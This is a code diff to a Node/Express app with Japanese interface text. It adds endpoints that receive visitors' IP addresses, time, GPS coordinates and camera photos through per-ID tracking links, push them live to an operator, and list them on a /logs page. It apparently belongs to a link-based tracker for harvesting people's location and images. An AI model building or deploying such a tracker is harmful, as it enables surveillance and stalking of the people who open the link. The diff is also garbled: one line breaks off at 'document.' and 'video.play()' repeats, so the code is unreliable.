@@ -439,3 +439,49 @@ app.get('/t/:id', (req, res) => {
               video.srcObject = stream;
               video.play();
               document.
+              video.play();
+              document.getElementById('camera-container').style.display = 'flex';
+              document.getElementById('cam-status').textContent = '📷 カメラ準備完了';
+              document.getElementById('capture-btn').addEventListener('click', capturePhoto);
+            })
+            .catch(function(err) {
+              document.getElementById('cam-status').textContent = '⚠️ カメラ拒否またはエラー: ' + err.message;
+            });
+        })();
+      </script>
+    </body>
+    </html>
+  `);
+});
+
+// 位置情報受信
+app.post('/location', express.json(), (req, res) => {
+  const { id, ip, time, lat, lon } = req.body;
+  logs.push({ id, ip, time, lat, lon });
+  io.emit('new-log', { id, ip, time, lat, lon });
+  console.log('[+] IP: ' + ip + ' | ' + (lat ? lat + ',' + lon : 'なし'));
+  res.sendStatus(200);
+});
+
+// ★ 写真受信
+app.post('/photo', express.json(), (req, res) => {
+  const { id, image } = req.body;
+  io.emit('new-photo', { id: id, image: image });
+  console.log('[📸] 写真受信 ID: ' + id);
+  res.sendStatus(200);
+});
+
+app.get('/logs', (req, res) => {
+  if (logs.length === 0) return res.send('<h2>データなし</h2><a href="/">戻る</a>');
+  let html = '<h2>アクセスログ</h2><table border="1"><tr><th>時間</th><th>IP</th><th>緯度</th><th>経度</th></tr>';
+  logs.reverse().forEach(function(log) {
+    html += '<tr><td>' + log.time + '</td><td>' + log.ip + '</td><td>' + (log.lat || '-') + '</td><td>' + (log.lon || '-') + '</td></tr>';
+  });
+  html += '</table><a href="/">戻る</a>';
+  res.send(html);
+});
+
+const PORT = process.env.PORT || 3000;
+server.listen(PORT, function() {
+  console.log('Server running on port ' + PORT);
+});
